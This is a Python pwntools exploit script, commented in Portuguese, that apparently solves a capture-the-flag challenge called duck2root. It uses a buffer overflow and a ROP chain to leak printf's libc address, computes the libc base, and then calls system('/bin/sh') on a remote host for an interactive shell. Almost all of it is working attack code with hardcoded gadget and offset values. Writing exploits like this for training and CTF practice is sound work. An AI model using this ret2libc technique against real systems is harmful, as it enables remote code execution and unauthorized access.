#!/usr/bin/env python3

from pwn import * 

exe = process('./duck2root_patched') # correr o programa vulnerável
p = remote("tribopapaxota.org", 5001) # establecer uma conexão

"""
Plano para vazar um endereço:
- usar puts
- fornecer argumentos para puts
- iremos usar ROP para fazer isto:
	mas vamos precisar de "x64 calling conventions"
- isto quer dizer que o registo 'rdi' será o primeiro argumento
	queremos encontrar um ropgadget que modifique (como um mov ou pop) o rdi 
"""

pop_rdi = 0x40126d # 0x000000000040126d : pop rdi ; ret (ROPgadget --bin duck2root_patched)
printf_at_got = 0x404018 # PTR_printf_00404018, endereço da função printf da libc na secção .got.plt no ghidra
puts_at_plt = 0x401030 # 00401030, endereço da função puts da libc na secção .plt no ghidra
back_to_vuln = 0x401272 # 00401272, endereço de vulnerable_function no ghidra

payload = b"A"*72 # criando o payload que vai fazer overflow, descobrimos isso com 'pattern offset $rsp'
payload += p64(pop_rdi) # fornecer um argumento para uma função que vamos acabar por chamar, system
payload += p64(printf_at_got) # endereço que queremos vazar
payload += p64(puts_at_plt) # ponto de chamada
payload += p64(back_to_vuln) # jump de volta para vuln

p.sendlineafter(f"Patonymous?>\n",payload) # enviar payload

leak = u64(p.recvline().strip().ljust(8, b"\x00")) # obter endereço vazado

log.info(f"Leaked printf libc address: {hex(leak)}") # printar na tela o endereço vazado

"""
Plano para calcular o offset (obter a diferença entre o endereço vazado e endereço de system)
entre printf (função que vazamos) e system (função que queremos chamar)

`readelf -s ./libc.so.6 | grep printf` (printar o endereço de printf)
2922: 00000000000606f0   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
"""
printf_offset = 0x606f0

# Agora vamos pegar no endereço vazado e suubtrair 0x606f0, e depois vamos achar o endereço verdadeiro da libc que foi carregado
base_address = leak - printf_offset
log.info(f"Leaked libc base address: {hex(base_address)}") # printar na tela o nosso endereço base da libc vazado

"""
calcular o endereço da função system

`readelf -s ./libc.so.6 | grep system`
1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
"""
libc_system = 0x50d70
log.info(f"Leaked system address: {hex(base_address + libc_system)}") # obter o endereço verdadeiro fisíco em memória de system

"""
ver se /bin/sh está em libc.so.6
strings libc.so.6 | grep /bin/sh
"""

"""
strings -a -t x ./libc.so.6 | grep "/bin/sh"
1d8678 /bin/sh
"""
libc_binsh = 0x1d8678

# segundo ROPchain (payload)

ret = 0x40101a # `ROPgadget --bin duck2root_patched | grep ret`

payload2 = b"A"*72 # criando o payload que vai fazer overflow
payload2 += p64(pop_rdi) # fornecer um argumento para uma função que vamos acabar por chamar, system
payload2 += p64(base_address + libc_binsh) # obter o endereço de /bin/sh na libc
payload2 += p64(ret) # para que sempre que chamarmos a função system, o último digito seja 0, basicamente para "stack allignment"
payload2 += p64(base_address + libc_system) # obter o endereço de system na lib

p.sendlineafter(f"Patonymous?>\n",payload2) # enviar o segundo payload

p.interactive()
